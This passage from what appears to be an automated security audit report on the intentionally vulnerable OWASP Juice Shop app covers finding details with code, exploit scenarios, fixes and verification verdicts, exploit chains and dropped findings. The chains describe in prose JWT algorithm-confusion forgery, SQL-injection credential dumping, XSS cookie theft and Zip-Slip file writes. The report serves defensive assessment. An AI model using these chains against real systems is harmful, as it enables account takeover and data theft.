The route handler returned by servePremiumContent() is mounted as an Express request handler reachable by any client. On invocation it unconditionally calls res.sendFile() on the premium asset. There is no req.user check, no session/entitlement lookup, and no role gate. The only logic present marks a challenge as solved (solveIf(... () => true)), which always evaluates true and is not an access decision. The served path is a fixed constant, so this is a vertical-access / paywall-bypass on a single resource rather than an attacker-varied IDOR.

#### Impact
Any anonymous visitor can download the premium 'paid' wallpaper asset without authenticating or paying. The handler performs no identity, role, entitlement, or payment verification before returning the protected file, defeating the paywall.

#### Exploit scenario
An unauthenticated attacker issues a GET to the premium-content route (e.g. /this/premium/path/...) and receives JuiceShop_Wallpaper_1920x1080_VR.jpg directly, with no login, purchase, or token required.

#### Preconditions
- Attacker can reach the route mapped to servePremiumContent()

```
export function servePremiumContent () {
  return (req: Request, res: Response) => {
    challengeUtils.solveIf(challenges.premiumPaywallChallenge, () => { return true })
    res.sendFile(path.resolve('frontend/dist/frontend/assets/private/JuiceShop_Wallpaper_1920x1080_VR.jpg'))
  }
}
```

#### How to fix
Authorization property: only entitled/paying users may receive premium content. In this handler add a check (e.g. verify req.user/session has the premium entitlement) before res.sendFile at line 11, and return 401/403 otherwise.

**Exploitability:** Premium content served with no entitlement check; single-resource paywall bypass. CVSS 5.3 Medium.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — Premium asset served unauthenticated via an unguarded route; no authz check exists and the path is externally reachable. Impact is limited to one low-sensitivity static image, so severity is low.

The code matches the snippet exactly. The route is mounted at server.ts:601 via `app.get(...)` with **no preceding auth middleware** — no `security.isAuthorized()`, no `appendUserId()`, no JWT gate. Juice Shop guards routes selectively (e.g., lines 577, 589 use `security.isAccounting()` / `isAuthorized()`), and this one has nothing.

Verification summary:

- **(A) What the code does:** Returns a handler that marks `premiumPaywallChallenge` solved (`solveIf(..., () => true)` — not an access decision) and unconditionally `res.sendFile()`s a fixed asset. Scanner read it correctly.
- **(B) Call chain:** `servePremiumContent()` → mounted on `app.get('/this/page/.../1btc/to/us', ...)` in server.ts. Externally reachable, unauthenticated. Reaches a network entry point. The other callers are test-only (`test/server/premiumRewardSpec.ts`).
- **(C) Defenses:** None. No middleware in front, fixed constant path (no IDOR/traversal), no session/entitlement/role check anywhere. The `solveIf` is challenge bookkeeping, not authz.
- **(D) N/A — no defense to probe.**

This is a genuine broken-access-control instance: a resource framed as "premium/paywalled" is served to any anonymous client with no entitlement check. The code confirms exactly the claimed flaw, the path is reachable, and nothing closes it.

Impact calibration: the gated resource is a single static wallpaper image (`JuiceShop_Wallpaper_1920x1080_VR.jpg`) — low-sensitivity, no PII, no privilege escalation, no integrity/availability effect. So the confidentiality impact is **Limited**, not High. The finding is accurate as a logic/authorization flaw but the real-world severity is low. (It is also an intentional Juice Shop challenge, but the bug class and exposure are real, so it remains a true positive for the access-control claim.)

### 64. [LOW] TOCTOU race lets one user like a review many times
**Class:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
**CWE:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition - https://cwe.mitre.org/data/definitions/367.html
**File:** `routes/likeProductReviews.ts:27-49`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.92 (1 run agreed)

#### Description
The handler reads the already-liked guard at line 28 (likedBy.includes(user.data.email)) and only commits the email into likedBy at lines 41-49, with an artificial 150 ms sleep (line 37) between the check and the act. Because the check and the mutation are not atomic and the email is only appended after the delay, two or more concurrent POSTs for the same review _id from the same session all pass the includes() check before any of them writes the email back. Each then increments likesCount (lines 32-35) and pushes the email (line 41), producing duplicate likes and a likedBy array containing the user's email more than once. The untrusted inputs are req.body.id (line 15) selecting the target review and the session-derived user (line 16); the security decision (the ownership/duplicate guard) is made at line 28 but acted on far later at line 46.

#### Impact
Any authenticated user can bypass the one-like-per-user restriction by firing concurrent requests, inflating a review's like count and recording their email multiple times in likedBy. The 403 'Not allowed' guard is rendered meaningless, corrupting review-popularity integrity.

#### Exploit scenario
An authenticated attacker sends ~5 parallel POST /rest/products/reviews requests with the same body {"id":"<reviewId>"} on one session. All five evaluate likedBy.includes(email)===false before any write completes, so each runs the $inc and pushes the email. The review ends with likesCount inflated by 5 and the attacker's email recorded multiple times (count > 2 even solves the timing-attack challenge at line 44).

#### Preconditions
- Attacker holds a valid authenticated session (any registered user)
- Attacker can issue concurrent HTTP requests for the same review id

```
const likedBy = review.likedBy
if (likedBy.includes(user.data.email)) {
  return res.status(403).json({ error: 'Not allowed' })
}
await db.reviewsCollection.update({ _id: id }, { $inc: { likesCount: 1 } })
await sleep(150)
...
updatedLikedBy.push(user.data.email)
```

#### How to fix
Make the like operation atomic: replace the read-check-sleep-write pattern with a single conditional update, e.g. update({ _id: id, likedBy: { $ne: user.data.email } }, { $inc: { likesCount: 1 }, $push: { likedBy: user.data.email } }) and treat a zero-matched result as 'already liked'. Remove the sleep at line 37 and the separate findOne/push at lines 39-49 so no check-then-act window exists.

**Exploitability:** TOCTOU multi-like; AC:H race, trivial integrity impact. CVSS 3.1 Low.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — real non-atomic check-then-act on an authenticated network route; concurrent POSTs defeat the includes() guard, inflating likesCount and duplicating likedBy (impact limited to integrity).

Confirmed. Entry point is `app.post('/rest/products/reviews', security.isAuthorized(), likeProductReviews())` at server.ts:590 — network-reachable by any authenticated user.

The code is exactly as reported:
- Line 27-30: read `likedBy`, check `includes(email)` → the "check"
- Line 32-35: `$inc likesCount`
- Line 37: artificial 150ms `sleep` widening the window
- Line 39-49: re-read, push email, `$set` likedBy → the "act"

The guard at line 28 and the mutation at line 41-49 are non-atomic, separated by a deliberate 150ms delay. Concurrent POSTs from the same session with the same `id` all evaluate `includes()===false` before any write completes, so each increments `likesCount` and pushes the email. This is in fact the intentional `timingAttackChallenge` (line 44 solves when `count > 2`).

**Verification of the verdict:**
- **External caller (B):** yes — authorized REST route, reachable over network.
- **Defences (C/D):** `isAuthorized()` only gates authentication, not concurrency. No locking, no atomic conditional update (`$addToSet`/conditional `$inc`), no DB-level uniqueness. The `includes()` guard is precisely the TOCTOU check that the race defeats. No control closes the window.
- **Impact:** data-integrity only — like-count inflation and duplicated `likedBy` entries. No confidentiality loss, no auth bypass, no RCE. Not pure volumetric DoS (it's a logic race producing persistent state corruption from a single burst), so it is in scope per rule D.

The race is genuine and reachable; impact is limited integrity. AC is High (requires winning a timing race / concurrent requests), PR Low (any authenticated user).

## Exploit Chains

### [CRITICAL] Pre-auth admin impersonation via JWT algorithm confusion
**Path:** #6 JWT verification uses RS256 public key as HMAC secret (alg confusion) → #9 Poison null byte bypasses file-extension allowlist in file server

isAuthorized/verify configure express-jwt with the RSA public key as the verification secret and pin no algorithm ([19]). The public key is distributed in clients and also readable from disk (e.g. via the file-server/key-server traversals like [0]). An attacker fetches the public key, mints an HS256 token whose payload sets role:'admin' and id of any user, signs it with the PEM bytes as the HMAC secret, and gains full admin authentication with zero credentials. The chatbot path ([51]) is independently vulnerable to the same forgery. No mitigating control exists.

### [CRITICAL] Login SQLi -> credential dump -> offline MD5 cracking
**Path:** #1 Unauthenticated SQL injection in login email field → #16 Passwords hashed with unsalted MD5

Unauthenticated SQLi in the login email field ([6]) comments out the password/deletedAt checks for instant auth bypass and supports UNION extraction of the Users table. Because passwords are single-round unsalted MD5 ([14]), the dumped hashes are crackable in seconds with precomputed tables, yielding plaintext credentials for admin and all users — converting a DB read into full multi-account takeover.

### [HIGH] Unauthenticated account takeover via reset-password brute force
**Path:** #51 Unauthenticated security-question disclosure for any user email → #7 Reset-password rate limit keyed on spoofable X-Forwarded-For header → #20 Unauthenticated password reset with no security-answer brute-force protection

The security question for any email is disclosed unauthenticated ([44]). The reset-password rate limiter keys on the attacker-controlled X-Forwarded-For header under trust-proxy, so rotating the header defeats throttling ([50]). With no lockout, the attacker brute-forces the low-entropy security answer against the unauthenticated reset endpoint ([42]) and sets an arbitrary new password — full account takeover of any known email without credentials.

### [HIGH] Stored XSS -> admin session theft via non-HttpOnly token
**Path:** #44 Stored XSS via weakly sanitized feedback comment → #41 Stored XSS in admin feedback table via bypassSecurityTrustHtml → #23 JWT session token set in cookie without HttpOnly/Secure flags

An unauthenticated/low-priv attacker submits feedback whose comment survives the under-configured sanitizer ([34]); the admin feedback table renders it with bypassSecurityTrustHtml, executing script in the admin's origin ([31]). Because the JWT session cookie is set without HttpOnly ([54]), the payload reads document.cookie and exfiltrates the admin token, escalating from a comment field to full admin compromise. Other admin-DOM XSS sinks ([28],[29]) provide the same pivot.

### [MEDIUM] Cross-origin secret theft -> credential cracking
**Path:** #49 JSONP callback enables cross-site exfiltration of user secrets → #46 Arbitrary user field selection leaks password hash and secrets → #16 Passwords hashed with unsalted MD5

currentUser supports an arbitrary field projection that returns password hash/totpSecret ([37]) and a JSONP callback that executes in a third-party origin while the browser still attaches the session cookie ([41]). An attacker page can read the victim's password hash cross-origin, then crack the unsalted MD5 ([14]) to recover the plaintext password. AC:H and the need for a logged-in victim visiting the malicious page keep this at medium.

### [HIGH] Unauthenticated arbitrary file write -> RCE
**Path:** #25 Temp file path built from attacker-controlled upload filename → #10 Zip-Slip arbitrary file write via unsanitized entry path

Both the multipart temp-file path ([63], path.join normalizes ../ out of tmpdir) and the Zip-Slip entry path ([1], guard only confines to project root) allow an unauthenticated attacker to write attacker-controlled bytes to chosen filesystem locations. Writing over application JS/config or a startup-loaded file within the project root can yield code execution on the next load. The distroless read-only filesystem of the official image partially limits writable locations, but writable upload/working directories remain reachable.

### [CRITICAL] Pre-auth admin self-registration -> privileged CRUD abuse
**Path:** #5 Mass-assignment lets anonymous user self-register as admin → #56 Any authenticated user can read every user record → #18 PUT /api/Products/:id update endpoint has no authorization

POST /api/Users accepts role:'admin' via mass assignment, so an anonymous attacker directly creates an admin account ([17]). With that session (or any session) the unguarded auto-CRUD surface lets them enumerate all user records ([53]) and tamper with products ([22]). This is a one-step pre-auth privilege escalation requiring no other bug.


## Dropped Findings

- **[UNCONFIRMED]** `routes/captcha.ts:32` logic-flaw (taint-11) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/chatbot.ts:70` injection (taint-18) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/chatbot.ts:104` injection (spec-batch-etl-15) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/keyServer.ts:6` info-leak (chunk-04) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/dataErasure.ts:72` logic-flaw (chunk-05) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `routes/profileImageUrlUpload.ts:30` injection (chunk-07) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `lib/challengeUtils.ts:58` injection (catchall-01) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `data/datacreator.ts:278` other (catchall-02) — s4 confidence 0.20 < gate 0.60
- **[UNCONFIRMED]** `routes/metrics.ts:52` other (catchall-07) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `ctf.key:1` other (catchall-13) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/codeql-analysis.yml:23` other (catchall-18) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/update-news-www.yml:17` injection (spec-batch-etl-21) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `config/bodgeit.yml:4` info-leak (catchall-23) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `data/static/web3-snippets/BeeFaucet.sol:14` integer-overflow (catchall-36) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `encryptionkeys/jwt.pub:1` logic-flaw (catchall-37) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `frontend/src/app/deluxe-user/deluxe-user.component.ts:54` injection (catchall-44) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `frontend/src/app/score-board/score-board.component.ts:85` injection (catchall-46) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `lib/noUpdate.ts:36` logic-flaw (spec-logic-bug-34) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `lib/startup/registerWebsocketEvents.ts:31` logic-flaw (catchall-60) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `lib/startup/registerWebsocketEvents.ts:43` other (catchall-60) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `models/card.ts:35` info-leak (catchall-66) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `models/securityAnswer.ts:39` info-leak (catchall-78) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/angular.ts:12` info-leak (catchall-83) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `routes/authenticatedUsers.ts:10` info-leak (catchall-86) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/payment.ts:18` logic-flaw (spec-crypto-81) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/profileImageFileUpload.ts:21` logic-flaw (catchall-105) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `routes/web3Wallet.ts:15` logic-flaw (catchall-118) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `views/promotionVideo.pug:30` injection (spec-crypto-105) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `lib/botUtils.ts:29` info-leak (spec-crypto-03) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `data/datacreator.ts:238` other (spec-crypto-04) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `routes/b2bOrder.ts:37` logic-flaw (spec-crypto-14) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `routes/profileImageUrlUpload.ts:25` info-leak (spec-crypto-16) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/update-news-www-legacy.yml:17` injection (spec-batch-etl-21) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `frontend/src/app/feedback-details/feedback-details.component.ts:23` injection (spec-crypto-25) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `lib/startup/customizeApplication.ts:80` injection (spec-crypto-35) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `models/securityAnswer.ts:39` logic-flaw (spec-crypto-54) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/authenticatedUsers.ts:22` info-leak (spec-crypto-62) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `routes/checkKeys.ts:16` other (spec-crypto-64) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `routes/checkKeys.ts:10` info-leak (spec-crypto-64) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/continueCode.ts:10` logic-flaw (spec-crypto-65) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/orderHistory.ts:12` info-leak (spec-crypto-80) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/resetPassword.ts:38` info-leak (spec-crypto-87) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/videoHandler.ts:53` injection (spec-crypto-95) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `views/dataErasureForm.hbs:21` injection (spec-crypto-103) — s4 confidence 0.25 < gate 0.60
- **[UNCONFIRMED]** `views/promotionVideo.pug:53` injection (spec-crypto-105) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `lib/insecurity.ts:169` logic-flaw (spec-logic-bug-02) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `lib/challengeUtils.ts:58` info-leak (spec-logic-bug-03) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `data/datacreator.ts:155` logic-flaw (spec-logic-bug-04) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `data/static/codefixes/dbSchemaChallenge_3.ts:5` type-confusion (spec-logic-bug-07) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `routes/profileImageUrlUpload.ts:30` logic-flaw (spec-logic-bug-16) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `frontend/src/app/feedback-details/feedback-details.component.html:14` injection (spec-logic-bug-25) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `models/basketitem.ts:36` logic-flaw (spec-logic-bug-39) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `models/card.ts:35` integer-overflow (spec-logic-bug-41) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `models/feedback.ts:40` injection (spec-logic-bug-45) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `models/recycle.ts:38` logic-flaw (spec-logic-bug-52) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `models/user.ts:56` injection (spec-logic-bug-56) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/angular.ts:9` info-leak (spec-logic-bug-59) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/payment.ts:29` logic-flaw (spec-logic-bug-81) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `routes/videoHandler.ts:22` logic-flaw (spec-logic-bug-95) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/rebase.yml:8` logic-flaw (spec-access-control-21) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `models/address.ts:30` logic-flaw (spec-access-control-37) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `routes/authenticatedUsers.ts:8` logic-flaw (spec-access-control-62) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/orderHistory.ts:22` info-leak (spec-access-control-80) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `lib/utils.ts:117` other (spec-batch-etl-03) — s4 confidence 0.45 < gate 0.60
- **[UNCONFIRMED]** `routes/order.ts:65` logic-flaw (spec-batch-etl-13) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `lib/startup/customizeApplication.ts:41` logic-flaw (spec-batch-etl-35) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `lib/startup/customizeApplication.ts:102` injection (spec-batch-etl-35) — s4 confidence 0.35 < gate 0.60
- **[UNCONFIRMED]** `routes/authenticatedUsers.ts:8` info-leak (spec-batch-etl-62) — s4 confidence 0.55 < gate 0.60
- **[UNCONFIRMED]** `routes/videoHandler.ts:78` logic-flaw (spec-batch-etl-95) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `Dockerfile:5` other (spec-iac-01) — s4 confidence 0.40 < gate 0.60
- **[UNCONFIRMED]** `.gitlab-ci.yml:5` logic-flaw (spec-iac-01) — s4 confidence 0.30 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/ci.yml:160` logic-flaw (spec-iac-02) — s4 confidence 0.50 < gate 0.60
- **[UNCONFIRMED]** `.github/workflows/codeql-analysis.yml:22` logic-flaw (spec-iac-02) — s4 confidence 0.40 < gate 0.60
- **[DUP (pre-verify)]** `routes/fileUpload.ts:110` unsafe-deserialization (taint-02) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/userProfile.ts:85` injection (taint-15) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/keyServer.ts:10` logic-flaw (chunk-04) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/deluxe.ts:16` logic-flaw (spec-access-control-72) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `lib/insecurity.ts:51` logic-flaw (spec-crypto-02) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/createProductReviews.ts:12` logic-flaw (spec-logic-bug-68) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/trackOrder.ts:9` injection (spec-access-control-12) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `frontend/src/app/last-login-ip/last-login-ip.component.ts:34` injection (spec-batch-etl-25) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/resetPassword.ts:13` logic-flaw (spec-access-control-87) — trivial: same file/class within line tolerance
- **[DUP (pre-verify)]** `routes/fileUpload.ts:80` other (chunk-03) — pre-verify semantic: XML billion-laughs is closed by the same disable-entity-expansion fix as the XXE.
- **[DUP (pre-verify)]** `routes/dataErasure.ts:65` info-leak (chunk-05) — pre-verify semantic: Same layout-param LFI in dataErasure at the same line.
- **[DUP (pre-verify)]** `lib/insecurity.ts:128` logic-flaw (chunk-09) — pre-verify semantic: Same open-redirect substring check; fix lives in isRedirectAllowed helper.
- **[DUP (pre-verify)]** `routes/vulnCodeFixes.ts:80` logic-flaw (spec-crypto-96) — pre-verify semantic: Same checkCorrectFix path traversal at the same file and line.
- **[DUP (pre-verify)]** `routes/basket.ts:12` logic-flaw (spec-access-control-63) — pre-verify semantic: Same basket IDOR; retrieveBasket is the handler called out in finding 24.
- **[DUP (pre-verify)]** `models/user.ts:76` logic-flaw (spec-logic-bug-56) — pre-verify semantic: Same role mass-assignment via /api/Users surfaced at the model attribute.
- **[DUP (pre-verify)]** `models/user.ts:70` other (spec-crypto-56) — pre-verify semantic: Same unsalted-MD5 defect; both flow through the security.hash helper.
- **[DUP (pre-verify)]** `routes/dataErasure.ts:65` injection (spec-crypto-70) — pre-verify semantic: Same layout-param LFI in dataErasure at the same line.
- **[DUP (pre-verify)]** `routes/fileUpload.ts:110` logic-flaw (spec-crypto-74) — pre-verify semantic: Same YAML bomb resource-exhaustion at the same yaml.load sink.
- **[DUP (pre-verify)]** `routes/fileUpload.ts:78` injection (spec-crypto-74) — pre-verify semantic: Same XXE entity-expansion at the same parseXml noent sink.
- **[DUP (pre-verify)]** `views/userProfile.pug:44` injection (spec-crypto-107) — pre-verify semantic: Same _username_ pre-compile substitution flaw closed by the same render fix.
- **[DUP (pre-verify)]** `routes/search.ts:17` logic-flaw (spec-logic-bug-18) — pre-verify semantic: Type-confusion truncation bypass is the same search SQLi flow at one sink.
- **[DUP (pre-verify)]** `routes/trackOrder.ts:9` logic-flaw (spec-access-control-12) — pre-verify semantic: Same track-order missing-ownership exposure; one authz fix closes both.
- **[DUP (pre-verify)]** `routes/chatbot.ts:146` logic-flaw (spec-access-control-15) — pre-verify semantic: Same unsanitized chatbot username at line 146 closed by one validation fix.
- **[DUP (pre-verify)]** `routes/memory.ts:19` logic-flaw (spec-access-control-78) — pre-verify semantic: Same unscoped getMemories query at the same line.
- **[FP]** `routes/vulnCodeSnippet.ts:86` logic-flaw (chunk-11) — upstream allow-list (retrieveCodeSnippet map lookup) gates the sink; traversal keys 404 before the path is built
- **[FP]** `routes/vulnCodeFixes.ts:80` other (taint-13) — line 73-74 requires `key` to match a real flat filename via `startsWith(\`${key}_\`)`; any traversal payload (contains `/`) matches no file, returns 404, and never reaches the line-80 sink.
- **[FP]** `routes/dataExport.ts:22` logic-flaw (spec-access-control-05) — appendUserId() middleware overwrites req.body.UserId with the JWT-derived authenticated id before the sink; attacker-controlled value never reaches the query
- **[FP]** `data/static/codefixes/loginBenderChallenge_4.ts:15` injection (catchall-10) — file is a static coding-challenge answer snippet served as a string, never imported or executed; no runtime call chain reaches the sink
- **[FP]** `routes/imageCaptcha.ts:49` logic-flaw (spec-logic-bug-05) — Logic flaw is genuine (CAPTCHA fails open when no record exists), but the only thing it bypasses is an anti-automation gate on the authenticated user's own data export; no cross-user data exposure, authz bypass, or RCE — no real security impact.
- **[FP]** `encryptionkeys/premium.key:1` info-leak (catchall-38) — Intentional Juice Shop CTF artifact; no code reads the key, the "paywall" only serves a static wallpaper, and the scanner's crypto-gating premise is wrong.
- **[FP]** `routes/address.ts:6` logic-flaw (spec-crypto-58) — appendUserId() middleware overwrites req.body.UserId with the JWT-derived id on all three routes, neutralizing the client-supplied value the finding depends on.
- **[FP]** `frontend/src/app/last-login-ip/last-login-ip.component.ts:29` injection (catchall-45) — real bypassSecurityTrustHtml sink, but lastLoginIp is sourced from the requester's own `true-client-ip` header and stored on the requester's own account; no path delivers an attacker's payload to a different victim, so it's self-XSS with no cross-boundary impact, not the account-takeover the scanner claims.
- **[FP]** `routes/appConfiguration.ts:6` info-leak (spec-access-control-60) — endpoint is intentionally public; served `config` is built only from non-sensitive config/*.yml, while real secrets (CTF_KEY/HMAC) come from env/file in lib/utils.ts and no env-var mapping merges them into the config object
- **[FP]** `routes/memory.ts:9` logic-flaw (catchall-99) — appendUserId() middleware overwrites req.body.UserId with the JWT-derived id before addMemory runs; client value is discarded
- **[FP]** `routes/orderHistory.ts:29` logic-flaw (spec-access-control-80) — route is gated by security.isAccounting(); the accounting role is intended to manage all orders' delivery, so there is no missing-ownership flaw (scanner missed the route guard)
- **[FP]** `routes/wallet.ts:7` logic-flaw (catchall-117) — appendUserId() middleware overwrites req.body.UserId with the JWT-bound id before the sink, closing the IDOR; scanner ignored the route guard.
- **[FP]** `routes/recycles.ts:9` injection (catchall-106) — Sequelize 6.37.8 with no operatorsAliases ignores string-keyed operators; JSON.parse can't yield the Symbol keys required, so `{"$gt":0}` is treated as a literal `id =` value, not an operator. Route is unauth-reachable but the injection cannot fire.
- **[FP]** `routes/wallet.ts:18` logic-flaw (catchall-117) — `appendUserId()` middleware overwrites body UserId with the JWT user id before the handler, killing the IDOR; residual self-topup is by-design in a payment-less demo with no cross-boundary impact.
- **[FP]** `server.ts:266` other (spec-crypto-01) — secret signs a cookie jar that no code path (`req.signedCookies`) ever reads; identity rests on JWT, so no forgeable trust exists
- **[FP]** `lib/insecurity.ts:38` logic-flaw (spec-crypto-02) — hmac() only hashes security-question answers; the reset check still requires the correct plaintext answer, so the public key grants no integrity/auth bypass as claimed.
- **[FP]** `routes/order.ts:137` logic-flaw (spec-batch-etl-13) — `security.appendUserId()` middleware (server.ts:322) overwrites `req.body.UserId` with the caller's own JWT id before `placeOrder` runs; the attacker-controlled UserId never reaches the wallet sink.
- **[FP]** `routes/nftMint.ts:33` logic-flaw (spec-crypto-79) — Endpoint is unauth-reachable and genuinely lacks signature verification, but its only effect is marking an intentional Juice Shop CTF challenge as solved; no data exposure, auth bypass, or code execution — by-design training functionality, no real-world security impact.
- **[FP]** `routes/restoreProgress.ts:15` logic-flaw (spec-crypto-88) — Code reads as scanner claims, but the only effect is marking one's own gamified CTF challenge progress as solved; no data exposure, auth bypass, or code execution. It's an intentional save/restore feature and itself a planted challenge — no real security impact.
- **[FP]** `routes/deluxe.ts:21` race-condition (spec-logic-bug-72) — UserId is server-set to the caller's own id (self-scoped, no cross-user impact) and the resulting negative balance is unspendable since every spend path gates on `balance >= price`; no real security impact.
- **[FP]** `routes/payment.ts:36` logic-flaw (spec-batch-etl-81) — appendUserId() middleware overwrites req.body.UserId with the authenticated session id before every payment handler, so the body value is never trusted
- **[DUP of #48]** `routes/web3Wallet.ts:18` info-leak (catchall-118) — Same hardcoded Alchemy API key surfacing at a second read point; one secret-rotation fix covers both.
- **[DUP of #6]** `lib/insecurity.ts:180` logic-flaw (spec-crypto-02) — Same JWT algorithm-confusion verification flaw in lib/insecurity.ts closed by one algorithm-pinning fix.


---

## Appendix: Scan Scope

### Folders scanned (114)

- `./`
- `.claude/`
- `.dependabot/`
- `.github/`
- `.github/ISSUE_TEMPLATE/`
- `.github/workflows/`
- `.gitlab/`
- `.well-known/csaf/`
- `.well-known/csaf/2017/`
- `.well-known/csaf/2021/`
- `.well-known/csaf/2024/`
- `config/`
- `data/`
- `data/static/`
- `data/static/codefixes/`
- `data/static/web3-snippets/`
- `encryptionkeys/`
- `frontend/`
- `frontend/src/`
- `frontend/src/app/`
- `frontend/src/app/Models/`
- `frontend/src/app/Services/`
- `frontend/src/app/about/`
- `frontend/src/app/accounting/`
- `frontend/src/app/address/`
- `frontend/src/app/address-create/`
- `frontend/src/app/address-select/`
- `frontend/src/app/administration/`
- `frontend/src/app/basket/`
- `frontend/src/app/challenge-solved-notification/`
- `frontend/src/app/challenge-status-badge/`
- `frontend/src/app/change-password/`
- `frontend/src/app/chatbot/`
- `frontend/src/app/code-area/`
- `frontend/src/app/code-fixes/`
- `frontend/src/app/code-snippet/`
- `frontend/src/app/complaint/`
- `frontend/src/app/contact/`
- `frontend/src/app/ctf-system-wide-notification/`
- `frontend/src/app/data-export/`
- `frontend/src/app/delivery-method/`
- `frontend/src/app/deluxe-user/`
- `frontend/src/app/error-page/`
- `frontend/src/app/faucet/`
- `frontend/src/app/feedback-details/`
- `frontend/src/app/forgot-password/`
- `frontend/src/app/last-login-ip/`
- `frontend/src/app/login/`
- `frontend/src/app/mat-search-bar/`
- `frontend/src/app/navbar/`
- `frontend/src/app/nft-unlock/`
- `frontend/src/app/oauth/`
- `frontend/src/app/order-completion/`
- `frontend/src/app/order-history/`
- `frontend/src/app/order-summary/`
- `frontend/src/app/password-strength/`
- `frontend/src/app/password-strength-info/`
- `frontend/src/app/payment/`
- `frontend/src/app/payment-method/`
- `frontend/src/app/photo-wall/`
- `frontend/src/app/privacy-policy/`
- `frontend/src/app/privacy-security/`
- `frontend/src/app/product-details/`
- `frontend/src/app/product-review-edit/`
- `frontend/src/app/purchase-basket/`
- `frontend/src/app/qr-code/`
- `frontend/src/app/recycle/`
- `frontend/src/app/register/`
- `frontend/src/app/saved-address/`
- `frontend/src/app/saved-payment-methods/`
- `frontend/src/app/score-board/`
